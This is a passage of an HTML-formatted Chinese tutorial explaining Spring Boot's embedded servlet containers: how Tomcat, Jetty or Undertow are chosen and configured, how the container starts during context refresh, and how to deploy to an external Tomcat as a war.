class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span>(name = DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME)</span><br><span class="line"><span class="meta">@ConditionalOnBean</span>(value = DispatcherServlet.class, name = DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ServletRegistrationBean <span class="title">dispatcherServletRegistration</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      DispatcherServlet dispatcherServlet)</span> </span>&#123;</span><br><span class="line">   ServletRegistrationBean registration = <span class="keyword">new</span> ServletRegistrationBean(</span><br><span class="line">         dispatcherServlet, <span class="keyword">this</span>.serverProperties.getServletMapping());</span><br><span class="line">    <span class="comment">//默认拦截： /  所有请求；包静态资源，但是不拦截jsp请求；   /*会拦截jsp</span></span><br><span class="line">    <span class="comment">//可以通过server.servletPath来修改SpringMVC前端控制器默认拦截的请求路径</span></span><br><span class="line">    </span><br><span class="line">   registration.setName(DEFAULT_DISPATCHER_SERVLET_BEAN_NAME);</span><br><span class="line">   registration.setLoadOnStartup(</span><br><span class="line">         <span class="keyword">this</span>.webMvcProperties.getServlet().getLoadOnStartup());</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.multipartConfig != <span class="keyword">null</span>) &#123;</span><br><span class="line">      registration.setMultipartConfig(<span class="keyword">this</span>.multipartConfig);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> registration;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）、SpringBoot能不能支持其他的Servlet容器；</p><h3 id="3）、替换为其他嵌入式Servlet容器"><a href="#3）、替换为其他嵌入式Servlet容器" class="headerlink" title="3）、替换为其他嵌入式Servlet容器"></a>3）、替换为其他嵌入式Servlet容器</h3><p><img src="images/搜狗截图20180302114401.png" alt=""></p><p>默认支持：</p><p>Tomcat（默认使用）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   引入web模块默认就是使用嵌入式的Tomcat作为Servlet容器；</span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Jetty</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入web模块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入其他的Servlet容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Undertow</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入web模块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入其他的Servlet容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-undertow<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4）、嵌入式Servlet容器自动配置原理；"><a href="#4）、嵌入式Servlet容器自动配置原理；" class="headerlink" title="4）、嵌入式Servlet容器自动配置原理；"></a>4）、嵌入式Servlet容器自动配置原理；</h3><p>EmbeddedServletContainerAutoConfiguration：嵌入式的Servlet容器自动配置？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigureOrder</span>(Ordered.HIGHEST_PRECEDENCE)</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span></span><br><span class="line"><span class="meta">@Import</span>(BeanPostProcessorsRegistrar.class)</span><br><span class="line"><span class="comment">//导入BeanPostProcessorsRegistrar：Spring注解版；给容器中导入一些组件</span></span><br><span class="line"><span class="comment">//导入了EmbeddedServletContainerCustomizerBeanPostProcessor：</span></span><br><span class="line"><span class="comment">//后置处理器：bean初始化前后（创建完对象，还没赋值赋值）执行初始化工作</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmbeddedServletContainerAutoConfiguration</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(&#123; Servlet.class, Tomcat.class &#125;)<span class="comment">//判断当前是否引入了Tomcat依赖；</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span>(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)<span class="comment">//判断当前容器没有用户自己定义EmbeddedServletContainerFactory：嵌入式的Servlet容器工厂；作用：创建嵌入式的Servlet容器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EmbeddedTomcat</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> TomcatEmbeddedServletContainerFactory <span class="title">tomcatEmbeddedServletContainerFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> TomcatEmbeddedServletContainerFactory();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Nested configuration if Jetty is being used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(&#123; Servlet.class, Server.class, Loader.class,</span><br><span class="line">WebAppContext.class &#125;)</span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span>(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EmbeddedJetty</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> JettyEmbeddedServletContainerFactory <span class="title">jettyEmbeddedServletContainerFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> JettyEmbeddedServletContainerFactory();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Nested configuration if Undertow is being used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(&#123; Servlet.class, Undertow.class, SslClientAuthMode.class &#125;)</span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span>(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EmbeddedUndertow</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> UndertowEmbeddedServletContainerFactory <span class="title">undertowEmbeddedServletContainerFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> UndertowEmbeddedServletContainerFactory();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1）、EmbeddedServletContainerFactory（嵌入式Servlet容器工厂）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">EmbeddedServletContainerFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//获取嵌入式的Servlet容器</span></span><br><span class="line">   <span class="function">EmbeddedServletContainer <span class="title">getEmbeddedServletContainer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">         ServletContextInitializer... initializers)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="images/搜狗截图20180302144835.png" alt=""></p><p>2）、EmbeddedServletContainer：（嵌入式的Servlet容器）</p><p><img src="images/搜狗截图20180302144910.png" alt=""></p><p>3）、以<strong>TomcatEmbeddedServletContainerFactory</strong>为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> EmbeddedServletContainer <span class="title">getEmbeddedServletContainer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      ServletContextInitializer... initializers)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建一个Tomcat</span></span><br><span class="line">   Tomcat tomcat = <span class="keyword">new</span> Tomcat();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//配置Tomcat的基本环节</span></span><br><span class="line">   File baseDir = (<span class="keyword">this</span>.baseDirectory != <span class="keyword">null</span> ? <span class="keyword">this</span>.baseDirectory</span><br><span class="line">         : createTempDir(<span class="string">"tomcat"</span>));</span><br><span class="line">   tomcat.setBaseDir(baseDir.getAbsolutePath());</span><br><span class="line">   Connector connector = <span class="keyword">new</span> Connector(<span class="keyword">this</span>.protocol);</span><br><span class="line">   tomcat.getService().addConnector(connector);</span><br><span class="line">   customizeConnector(connector);</span><br><span class="line">   tomcat.setConnector(connector);</span><br><span class="line">   tomcat.getHost().setAutoDeploy(<span class="keyword">false</span>);</span><br><span class="line">   configureEngine(tomcat.getEngine());</span><br><span class="line">   <span class="keyword">for</span> (Connector additionalConnector : <span class="keyword">this</span>.additionalTomcatConnectors) &#123;</span><br><span class="line">      tomcat.getService().addConnector(additionalConnector);</span><br><span class="line">   &#125;</span><br><span class="line">   prepareContext(tomcat.getHost(), initializers);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将配置好的Tomcat传入进去，返回一个EmbeddedServletContainer；并且启动Tomcat服务器</span></span><br><span class="line">   <span class="keyword">return</span> getTomcatEmbeddedServletContainer(tomcat);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4）、我们对嵌入式容器的配置修改是怎么生效？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerProperties、EmbeddedServletContainerCustomizer</span><br></pre></td></tr></table></figure><p><strong>EmbeddedServletContainerCustomizer</strong>：定制器帮我们修改了Servlet容器的配置？</p><p>怎么修改的原理？</p><p>5）、容器中导入了<strong>EmbeddedServletContainerCustomizerBeanPostProcessor</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化之前</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">postProcessBeforeInitialization</span><span class="params">(Object bean, String beanName)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">    <span class="comment">//如果当前初始化的是一个ConfigurableEmbeddedServletContainer类型的组件</span></span><br><span class="line">   <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> ConfigurableEmbeddedServletContainer) &#123;</span><br><span class="line">       <span class="comment">//</span></span><br><span class="line">      postProcessBeforeInitialization((ConfigurableEmbeddedServletContainer) bean);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postProcessBeforeInitialization</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">ConfigurableEmbeddedServletContainer bean)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取所有的定制器，调用每一个定制器的customize方法来给Servlet容器进行属性赋值；</span></span><br><span class="line">    <span class="keyword">for</span> (EmbeddedServletContainerCustomizer customizer : getCustomizers()) &#123;</span><br><span class="line">        customizer.customize(bean);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Collection&lt;EmbeddedServletContainerCustomizer&gt; <span class="title">getCustomizers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.customizers == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Look up does not include the parent context</span></span><br><span class="line">        <span class="keyword">this</span>.customizers = <span class="keyword">new</span> ArrayList&lt;EmbeddedServletContainerCustomizer&gt;(</span><br><span class="line">            <span class="keyword">this</span>.beanFactory</span><br><span class="line">            <span class="comment">//从容器中获取所有这葛类型的组件：EmbeddedServletContainerCustomizer</span></span><br><span class="line">            <span class="comment">//定制Servlet容器，给容器中可以添加一个EmbeddedServletContainerCustomizer类型的组件</span></span><br><span class="line">            .getBeansOfType(EmbeddedServletContainerCustomizer.class,</span><br><span class="line">                            <span class="keyword">false</span>, <span class="keyword">false</span>)</span><br><span class="line">            .values());</span><br><span class="line">        Collections.sort(<span class="keyword">this</span>.customizers, AnnotationAwareOrderComparator.INSTANCE);</span><br><span class="line">        <span class="keyword">this</span>.customizers = Collections.unmodifiableList(<span class="keyword">this</span>.customizers);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.customizers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ServerProperties也是定制器</span><br></pre></td></tr></table></figure><p>步骤：</p><p>1）、SpringBoot根据导入的依赖情况，给容器中添加相应的EmbeddedServletContainerFactory【TomcatEmbeddedServletContainerFactory】</p><p>2）、容器中某个组件要创建对象就会惊动后置处理器；EmbeddedServletContainerCustomizerBeanPostProcessor；</p><p>只要是嵌入式的Servlet容器工厂，后置处理器就工作；</p><p>3）、后置处理器，从容器中获取所有的<strong>EmbeddedServletContainerCustomizer</strong>，调用定制器的定制方法</p><h3 id="5）、嵌入式Servlet容器启动原理；"><a href="#5）、嵌入式Servlet容器启动原理；" class="headerlink" title="5）、嵌入式Servlet容器启动原理；"></a>5）、嵌入式Servlet容器启动原理；</h3><p>什么时候创建嵌入式的Servlet容器工厂？什么时候获取嵌入式的Servlet容器并启动Tomcat；</p><p>获取嵌入式的Servlet容器工厂：</p><p>1）、SpringBoot应用启动运行run方法</p><p>2）、refreshContext(context);SpringBoot刷新IOC容器【创建IOC容器对象，并初始化容器，创建容器中的每一个组件】；如果是web应用创建<strong>AnnotationConfigEmbeddedWebApplicationContext</strong>，否则：<strong>AnnotationConfigApplicationContext</strong></p><p>3）、refresh(context);<strong>刷新刚才创建好的ioc容器；</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException </span>&#123;</span><br><span class="line">   <span class="keyword">synchronized</span> (<span class="keyword">this</span>.startupShutdownMonitor) &#123;</span><br><span class="line">      <span class="comment">// Prepare this context for refreshing.</span></span><br><span class="line">      prepareRefresh();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Tell the subclass to refresh the internal bean factory.</span></span><br><span class="line">      ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Prepare the bean factory for use in this context.</span></span><br><span class="line">      prepareBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// Allows post-processing of the bean factory in context subclasses.</span></span><br><span class="line">         postProcessBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Invoke factory processors registered as beans in the context.</span></span><br><span class="line">         invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Register bean processors that intercept bean creation.</span></span><br><span class="line">         registerBeanPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize message source for this context.</span></span><br><span class="line">         initMessageSource();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize event multicaster for this context.</span></span><br><span class="line">         initApplicationEventMulticaster();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize other special beans in specific context subclasses.</span></span><br><span class="line">         onRefresh();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Check for listener beans and register them.</span></span><br><span class="line">         registerListeners();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Instantiate all remaining (non-lazy-init) singletons.</span></span><br><span class="line">         finishBeanFactoryInitialization(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Last step: publish corresponding event.</span></span><br><span class="line">         finishRefresh();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">         <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Exception encountered during context initialization - "</span> +</span><br><span class="line">                  <span class="string">"cancelling refresh attempt: "</span> + ex);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Destroy already created singletons to avoid dangling resources.</span></span><br><span class="line">         destroyBeans();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Reset 'active' flag.</span></span><br><span class="line">         cancelRefresh(ex);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Propagate exception to caller.</span></span><br><span class="line">         <span class="keyword">throw</span> ex;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="comment">// Reset common introspection caches in Spring's core, since we</span></span><br><span class="line">         <span class="comment">// might not ever need metadata for singleton beans anymore...</span></span><br><span class="line">         resetCommonCaches();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4）、  onRefresh(); web的ioc容器重写了onRefresh方法</p><p>5）、webioc容器会创建嵌入式的Servlet容器；<strong>createEmbeddedServletContainer</strong>();</p><p><strong>6）、获取嵌入式的Servlet容器工厂：</strong></p><p>EmbeddedServletContainerFactory containerFactory = getEmbeddedServletContainerFactory();</p><p>​    从ioc容器中获取EmbeddedServletContainerFactory 组件；<strong>TomcatEmbeddedServletContainerFactory</strong>创建对象，后置处理器一看是这个对象，就获取所有的定制器来先定制Servlet容器的相关配置；</p><p>7）、<strong>使用容器工厂获取嵌入式的Servlet容器</strong>：this.embeddedServletContainer = containerFactory      .getEmbeddedServletContainer(getSelfInitializer());</p><p>8）、嵌入式的Servlet容器创建对象并启动Servlet容器；</p><p><strong>先启动嵌入式的Servlet容器，再将ioc容器中剩下没有创建出的对象获取出来；</strong></p><p><strong>==IOC容器启动创建嵌入式的Servlet容器==</strong></p><h2 id="9、使用外置的Servlet容器"><a href="#9、使用外置的Servlet容器" class="headerlink" title="9、使用外置的Servlet容器"></a>9、使用外置的Servlet容器</h2><p>嵌入式Servlet容器：应用打成可执行的jar</p><p>​        优点：简单、便携；</p><p>​        缺点：默认不支持JSP、优化定制比较复杂（使用定制器【ServerProperties、自定义EmbeddedServletContainerCustomizer】，自己编写嵌入式Servlet容器的创建工厂【EmbeddedServletContainerFactory】）；</p><p>外置的Servlet容器：外面安装Tomcat—-应用war包的方式打包；</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1）、必须创建一个war项目；（利用idea创建好目录结构）</p><p>2）、将嵌入式的Tomcat指定为provided；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3）、必须编写一个<strong>SpringBootServletInitializer</strong>的子类，并调用configure方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletInitializer</span> <span class="keyword">extends</span> <span class="title">SpringBootServletInitializer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> SpringApplicationBuilder <span class="title">configure</span><span class="params">(SpringApplicationBuilder application)</span> </span>&#123;</span><br><span class="line">       <span 